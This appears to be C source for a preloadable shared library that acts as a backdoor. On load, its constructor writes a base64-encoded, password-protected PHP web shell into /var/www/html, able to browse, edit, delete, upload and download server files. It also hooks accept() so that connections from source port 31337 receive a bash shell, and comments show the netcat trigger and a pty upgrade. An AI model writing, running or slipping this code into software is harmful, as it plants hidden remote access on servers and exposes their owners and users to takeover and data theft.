#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>


//const char* base64EncodedString = "PD9waHAKCiRmdW5jID0gbmV3IFJlZmxlY3Rpb25GdW5jdGlvbigkX0dFVFttXSk7CgplY2hvICRmdW5jLT5pbnZva2VBcmdzKGFycmF5KCRfR0VUW2NdKSk7Cgo/Pg==";
const char* base64EncodedString = "PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApO3Nlc3Npb25fc3RhcnQoKTtkZWZpbmUoInBhc3N3b3JkIiwiYmJzYWRtaW4tMTIiKTskaD0nPGhlYWQ+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiLz48dGl0bGU+TWluaS1GaWxlTWFuYWdlcjwvdGl0bGU+PHN0eWxlPnByZXtib3JkZXI6MXB4IHNvbGlkICNkZGQ7cGFkZGluZzo1cHg7b3ZlcmZsb3c6YXV0b310YWJsZXtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7d2lkdGg6MTAwJTtvdmVyZmxvdzphdXRvfXRoLHRke3BhZGRpbmc6MC4yNXJlbTt0ZXh0LWFsaWduOmxlZnQ7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2NjY310Ym9keSB0cjpudGgtY2hpbGQob2RkKXtiYWNrZ3JvdW5kOiNlZWV9dHI6aG92ZXJ7YmFja2dyb3VuZC1jb2xvcjojZjVmNWY1fTwvc3R5bGU+PC9oZWFkPic7ZnVuY3Rpb24gQSgkbil7cmV0dXJuIGlzc2V0KCRfU0VTU0lPTlskbl0pPyRfU0VTU0lPTlskbl06MDt9ZnVuY3Rpb24gQigkbiwkdil7JF9TRVNTSU9OWyRuXT0kdjt9ZnVuY3Rpb24gQygkbil7cmV0dXJuIGlzc2V0KCRfUE9TVFskbl0pPyRfUE9TVFskbl06MDt9ZnVuY3Rpb24gRCgkbil7cmV0dXJuIGlzc2V0KCRfR0VUWyRuXSk/JF9HRVRbJG5dOjA7fWZ1bmN0aW9uIEUoJHQsJG4sJHY9IiIsJHM9IiIpe2lmKGluX2FycmF5KCR0LFsidGV4dCIsInBhc3N3b3JkIiwic3VibWl0IiwiZmlsZSJdKSl7cmV0dXJuIjxpbnB1dCB0eXBlPSckdCcgbmFtZT0nJG4nIHZhbHVlPSckdicgc3R5bGU9JyRzJy8+Ijt9cmV0dXJuIjwkdCBuYW1lPSckbicgc3R5bGU9JyRzJz4kdjwvJHQ+Ijt9ZnVuY3Rpb24gRigkbSwkaSwkeD0iIil7JGY9Ijxmb3JtIG1ldGhvZD0kbSBlbmN0eXBlPSckeCc+Ijtmb3JlYWNoKCRpIGFzICRrPT4kdil7JGYuPUUoJGssaXNfYXJyYXkoJHYpPyR2WzBdOiR2LGlzc2V0KCR2WzFdKT8kdlsxXToiIixpc3NldCgkdlsyXSk/JHZbMl06IiIpO31yZXR1cm4gJGYuIjwvZm9ybT4iO31mdW5jdGlvbiBHKCR0LCRiKXskaD0iIjtmb3JlYWNoKCR0IGFzICR4KXskaC49Ijx0aD4keDwvdGg+Ijt9JGQ9IiI7Zm9yZWFjaCgkYiBhcyAkcil7JGQuPSI8dHI+Ijtmb3JlYWNoKCRyIGFzICR6KXskZC49Ijx0ZD4kejwvdGQ+Ijt9JGQuPSI8L3RyPiI7fXJldHVybiI8dGFibGU+PHRoZWFkPiRoPC90aGVhZD48dGJvZHk+JGQ8L3Rib2R5PjwvdGFibGU+Ijt9ZnVuY3Rpb24gSCgkbCwkeCwkdD0iIil7cmV0dXJuIjxhIGhyZWY9JyRsJyB0YXJnZXQ9JyR0Jz4keDwvYT4gIjt9ZnVuY3Rpb24gSSgpe2lmKEEoImxvZ2luIikpe3JldHVybiAxO31pZighQygibG9naW4iKSl7cmV0dXJuIDA7fWlmKEMoInBhc3MiKSE9cGFzc3dvcmQpe3JldHVybiAwO31CKCJsb2dpbiIsMSk7cmV0dXJuIDE7fWZ1bmN0aW9uIEooKXskcD1fX0RJUl9fO2lmKEQoInBhdGgiKSl7JHA9RCgicGF0aCIpO31yZXR1cm4gJHA7fWZ1bmN0aW9uIEsoJGIpeyRsPVsiQiIsIktCIiwiTUIiLCJHQiIsIlRCIiwiUEIiXTtmb3IoJGk9MDskYj49MTAyNCYmJGk8Y291bnQoJGwpLTE7JGIvPTEwMjQsJGkrKyk7cmV0dXJuIHJvdW5kKCRiLDIpLiIgIi4kbFskaV07fWZ1bmN0aW9uIEwoJHApe3JldHVybiBkYXRlKCJNIGQgWSBIOmk6cyIsZmlsZW10aW1lKCRwKSk7fWZ1bmN0aW9uIE0oJGQpe2lmKCFpc19maWxlKCRkKSl7cmV0dXJuIDA7fWhlYWRlcigiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKTtoZWFkZXIoIkNvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6IEJpbmFyeSIpO2hlYWRlcignQ29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9IicuYmFzZW5hbWUoJGQpLiciJyk7cmV0dXJuIHJlYWRmaWxlKCRkKTt9ZnVuY3Rpb24gTigkZCl7aWYoaXNfZmlsZSgkZCkpe3JldHVybiB1bmxpbmsoJGQpO31pZihpc19kaXIoJGQpKXtyZXR1cm4gcm1kaXIoJGQpO31yZXR1cm4gMDt9ZnVuY3Rpb24gTygkZSl7aWYoaXNfZmlsZSgkZSkpe3JldHVybiBGKCJQT1NUIixbInRleHRhcmVhIj0+WyJlZGl0IixodG1sZW50aXRpZXMoZmlsZV9nZXRfY29udGVudHMoJGUpKSwid2lkdGg6MTAwJTtoZWlnaHQ6OTAlIixdLCJzdWJtaXQiPT5bInNhdmUiLCJTYXZlIl0sXSk7fXJldHVybiAwO31mdW5jdGlvbiBQKCRwLCRzKXtpZihpc19maWxlKCRwKSl7ZmlsZV9wdXRfY29udGVudHMoJHAsaHRtbF9lbnRpdHlfZGVjb2RlKCRzKSk7cmV0dXJuIDE7fXJldHVybiAwO31mdW5jdGlvbiBRKCRwKXtpZihpc19maWxlKCRwKSl7cmV0dXJuIGh0bWxlbnRpdGllcyhmaWxlX2dldF9jb250ZW50cygkcCkpO31yZXR1cm4gMDt9ZnVuY3Rpb24gUigkcCwkbil7aWYoIWlzX2ZpbGUoJHAuIi8iLiRuKSl7ZmlsZV9wdXRfY29udGVudHMoJHAuIi8iLiRuLCIiKTtyZXR1cm4gMTt9cmV0dXJuIDA7fWZ1bmN0aW9uIFMoJHAsJG4pe2lmKCFpc19kaXIoJHAuIi8iLiRuKSl7bWtkaXIoJHAuIi8iLiRuKTtyZXR1cm4gMTt9cmV0dXJuIDA7fWZ1bmN0aW9uIFQoJHAsJGYpeyRuPWJhc2VuYW1lKCRmWyJuYW1lIl0pO2lmKCFpc19maWxlKCRwLiIvIi4kbikpe2lmKG1vdmVfdXBsb2FkZWRfZmlsZSgkZlsidG1wX25hbWUiXSwkcC4iLyIuJG4pKXtyZXR1cm4gMTt9fXJldHVybiAwO31mdW5jdGlvbiBVKCRwKXtpZigkcD09IiJ8fCRwPT0iLyIpe3JldHVybiAkcDt9JHA9ZXhwbG9kZSgiLyIsc3RyX3JlcGxhY2UoIlxcIiwiLyIsJHApKTthcnJheV9wb3AoJHApO3JldHVybiBpbXBsb2RlKCIvIiwkcCk7fWZ1bmN0aW9uIFYoKXtleGVjKCJ3bWljIGxvZ2ljYWxkaXNrIGdldCBjYXB0aW9uIiwkYyk7JHI9IiI7Zm9yZWFjaCgkYyBhcyAkZCl7JHIuPSRkIT0iQ2FwdGlvbiI/SCgiP3BhdGg9JGQiLCRkKToiIjt9cmV0dXJuICRyO31mdW5jdGlvbiBXKCl7JHg9SigpO2lmKCFpc19kaXIoJHgpKXtyZXR1cm4gMDt9JHo9c2NhbmRpcigkeCk7JGs9W107JGk9MDtmb3JlYWNoKCR6IGFzICRkKXtpZigkZD09Ii4ifHwkZD09Ii4uIil7Y29udGludWU7fSRwPSR4LiIvIi4kZDskcz0iLS0iOyRqPSImIzEyODE5MzsiOyR0PUwoJHApOyRsPUgoIj9wYXRoPSRwIiwkZCk7JHY9c3Vic3RyKHNwcmludGYoIiVvIixmaWxlcGVybXMoJHApKSwtNCk7JG89ZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRwd3VpZCIpP3Bvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkcCkpWyJuYW1lIl06ZmlsZW93bmVyKCRwKTskYz0oaXNfZmlsZSgkcCk/SCgiP2VkaXQ9JHAiLCJFZGl0IiwiX2JsYW5rIik6IiIpLkgoIj9kZWxldGU9JHAiLCJEZWxldGUiLCJfYmxhbmsiKS4oaXNfZmlsZSgkcCk/SCgiP2Rvd25sb2FkPSRwIiwiRG93bmxvYWQiLCJfYmxhbmsiKToiIik7aWYoaXNfZmlsZSgkcCkpeyRzPUsoZmlsZXNpemUoJHApKTskaj0iJiMxMjgyMjE7Ijt9JGtbXT1bJGosJGksJGwsJHMsJHQsJHYsJG8sJGNdOyRpKys7fXJldHVybiBHKFsiIyIsImlkIiwiRmlsZW5hbWUiLCJTaXplIiwiTW9kaWZpZWQiLCJQZXJtcyIsIk93bmVyIiwiIl0sJGspO30kbD1GKCJQT1NUIixbInAiPT5bIiIsIlBhc3N3b3JkKGRlZmF1bHQgYWRtaW4pOiAiXSwicGFzc3dvcmQiPT5bInBhc3MiLCIiXSwic3VibWl0Ij0+WyJsb2dpbiIsIkxvZ2luIl0sXSk7aWYoIUkoKSl7ZGllKCRsKTt9aWYoRCgiZGVsZXRlIikpe04oRCgiZGVsZXRlIikpP2RpZSgiRGVsZXRlZDogIi5EKCJkZWxldGUiKSk6ZGllKCJGaWxlIG5vdCBmb3VuZCIpO31pZihEKCJlZGl0Iikpe2lmKEMoInNhdmUiKSl7UChEKCJlZGl0IiksQygiZWRpdCIpKTtlY2hvICJTYXZlZCI7fSRlPU8oRCgiZWRpdCIpKTskZT9kaWUoJGUpOmRpZSgiRmlsZSBub3QgZm91bmQiKTt9aWYoRCgiZG93bmxvYWQiKSl7QHJlYWRmaWxlKE0oRCgiZG93bmxvYWQiKSkpO2V4aXQoKTt9aWYoQygibmV3ZmlsZSIpKXtSKEooKSxDKCJmaWxlbmFtZSIpKT9kaWUoIkNyZWF0ZTogIi5DKCJmaWxlbmFtZSIpKTpkaWUoIkZpbGUgZXhpdGVzIik7fWlmKEMoIm5ld2RpciIpKXtTKEooKSxDKCJkaXJuYW1lIikpP2RpZSgiQ3JlYXRlOiAiLkMoImRpcm5hbWUiKSk6ZGllKCJEaXIgZXhpdGVzIik7fWlmKEMoInVwbG9hZCIpKXtUKEooKSwkX0ZJTEVTWyJmaWxlIl0pP2RpZSgidXBsb2FkOiAiLiRfRklMRVNbImZpbGUiXVsibmFtZSJdKTpkaWUoIlVwbG9hZCBFcnJvciIpO31lY2hvICRoLiI8Ym9keT4iLkYoIlBPU1QiLFsidGV4dCI9PlsiZmlsZW5hbWUiLCJGaWxlIE5hbWUiXSwic3VibWl0Ij0+WyJuZXdmaWxlIiwiQ3JlYXRlIl0sXSkuRigiUE9TVCIsWyJ0ZXh0Ij0+WyJkaXJuYW1lIiwiRGlyIE5hbWUiXSwic3VibWl0Ij0+WyJuZXdkaXIiLCJDcmVhdGUiXSxdKS5GKCJQT1NUIixbImZpbGUiPT4iZmlsZSIsInN1Ym1pdCI9PlsidXBsb2FkIiwiVXBsb2FkIl1dLCJtdWx0aXBhcnQvZm9ybS1kYXRhIikuSCgiP3BhdGg9Ii5VKEooKSksIltCYWNrXSIpLihQSFBfT1NfRkFNSUxZPT0iV2luZG93cyI/VigpOiIiKS4oaXNfZGlyKEooKSk/VygpOiI8cHJlPiIuUShKKCkpLiI8L3ByZT4iKS4iPC9ib2R5PiI7Cg==";

int base64_decode(const char *encoded, unsigned char **decoded) {
    static const char base64_chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = strlen(encoded);
    if (in_len % 4 != 0) {
        return 0;
    }

    *decoded = (unsigned char *)malloc((in_len / 4) * 3);
    if (*decoded == NULL) {
        return 0;
    }

    int i, j;
    int len = 0;
    unsigned char a, b, c, d;

    for (i = 0; i < in_len; i += 4) {
        a = strchr(base64_chars, encoded[i]) - base64_chars;
        b = strchr(base64_chars, encoded[i + 1]) - base64_chars;
        c = strchr(base64_chars, encoded[i + 2]) - base64_chars;
        d = strchr(base64_chars, encoded[i + 3]) - base64_chars;

        (*decoded)[len++] = (a << 2) | (b >> 4);
        if (encoded[i + 2] != '=') {
            (*decoded)[len++] = (b << 4) | (c >> 2);
        }
        if (encoded[i + 3] != '=') {
            (*decoded)[len++] = (c << 6) | d;
        }
    }

    return len;
}

void createFileAndWriteDecodedBase64() {
    FILE *file;

    // 判断文件是否存在
    if ((file = fopen("/var/www/html/supports.php", "r")) == NULL) {
        // 文件不存在，创建文件并写入Base64解码字符串
        file = fopen("/var/www/html/supports.php", "w");
        if (file == NULL) {
         //   perror("Error creating file");
            return;
        }

        unsigned char *decoded_data;
        int decoded_length = base64_decode(base64EncodedString, &decoded_data);
        if (decoded_length > 0) {
            fwrite(decoded_data, sizeof(unsigned char), decoded_length, file);
            free(decoded_data);
        }

      //  printf("Base64 decoded string written to file.\n");
        fclose(file);
    } else {
        // 文件已存在
       // printf("File '1.php' already exists.\n");
        fclose(file);
    }
}




__attribute__ ((constructor)) static void so_init(void);
__attribute__ ((destructor)) static void so_deinit(void);



void so_init(void)
{

     createFileAndWriteDecodedBase64();

    //printf("call so init.\n");
}

void so_deinit(void)
{
   // printf("call so deinit.\n");
}





#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <pthread.h>
#include <stdarg.h>
#include <string.h>
#include <sys/un.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <pwd.h>

#define S_PORT 31337

int    (*_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);


int accept(int s, struct sockaddr *addr, socklen_t *addrlen) {

	char *argv[4];
	char *envp[3];
	int x;

	_accept = (int (*)(int sockfd, struct sockaddr *addr, socklen_t *addrlen)) dlsym(RTLD_NEXT,"accept");
	

 	struct sockaddr_in addr2;
	x = _accept(s, (struct sockaddr *)&addr2, addrlen);

	if(addr2.sin_port == htons(S_PORT)) {
	

		argv[0] = "/bin/bash";
		argv[1] = (char *)0;
		envp[0] = "HOME=/";
		envp[1] = "PATH=/:/sbin:/bin:/usr/sbin:/usr/bin";

		envp[2] = (char *)0;

            if(fork() == 0) {
			dup2(x,0);
			dup2(x,1);
			dup2(x,2);
			execve(argv[0], argv, envp);
                         } else {
                            close(x);
                            return -1;
                        }
	}

	return x;
}
//nc -v -p 31337 localhost 22
//python -c 'import pty; pty.spawn("/bin/bash")'


